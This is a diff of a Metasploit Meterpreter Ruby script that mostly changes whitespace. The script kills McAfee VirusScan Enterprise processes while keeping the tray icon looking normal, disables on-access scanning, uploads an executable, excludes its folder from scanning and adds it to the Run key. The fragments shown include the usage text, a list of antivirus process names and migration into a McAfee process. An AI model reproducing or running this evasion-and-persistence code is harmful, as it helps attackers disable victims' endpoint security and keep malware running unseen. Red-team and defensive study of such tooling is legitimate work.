@@ -1,11 +1,14 @@
-# Meterpreter script that kills Mcafee VirusScan Enterprise v8.7.0i+ processes in magic 
+# $Id$
+# $Revision$
+
+# Meterpreter script that kills Mcafee VirusScan Enterprise v8.7.0i+ processes in magic
 # order which keeps VirusScan icon visible at system tray without disabled sign on it.
-# Additionally it lets you disable On Access Scanner from registry, upload your detectable 
-# binary to TEMP folder, add that folder to the VirusScan exclusion list and CurrentVersion\Run 
+# Additionally it lets you disable On Access Scanner from registry, upload your detectable
+# binary to TEMP folder, add that folder to the VirusScan exclusion list and CurrentVersion\Run
 # registry key. (Requires administrator privilege. Tested on XP SP3)
 #
 # Credits: hdm, jduck, Jerome Athias (borrowed some of their codes)
-# 
+#
 # Provided by: Mert SARICA - mert.sarica [@] gmail.com - http://www.mertsarica.com
 
 session = client
@@ -18,10 +21,10 @@ session = client
 ################## function declaration Declarations ##################
 def usage()
 	print_line "\nAuthor: Mert SARICA (mert.sarica [@] gmail.com) \t\tWeb: http://www.mertsarica.com"
-	print_line "----------------------------------------------------------------------------------------------" 
+	print_line "----------------------------------------------------------------------------------------------"
 	print_line "Bypasses Mcafee VirusScan Enterprise v8.7.0i+, uploads an executable to TEMP folder adds it"
 	print_line "to exclusion list and set it to run at startup. (Requires administrator privilege)"
-	print_line "----------------------------------------------------------------------------------------------" 
+	print_line "----------------------------------------------------------------------------------------------"
 	print_line(@@exec_opts.usage)
 end
 
@@ -83,7 +86,7 @@ avs = %W{
 	mctray.exe
 	mfeann.exe
 	vstskmgr.exe
-	mcshield.exe	
+	mcshield.exe
 }
 
 av = 0
@@ -107,7 +110,7 @@ target_pid = nil
 target ||= "mfevtps.exe"
 
 print_status("Migrating to #{target}...")
-	
+
 # Get the target process pid
 target_pid = client.sys.process[target]
 
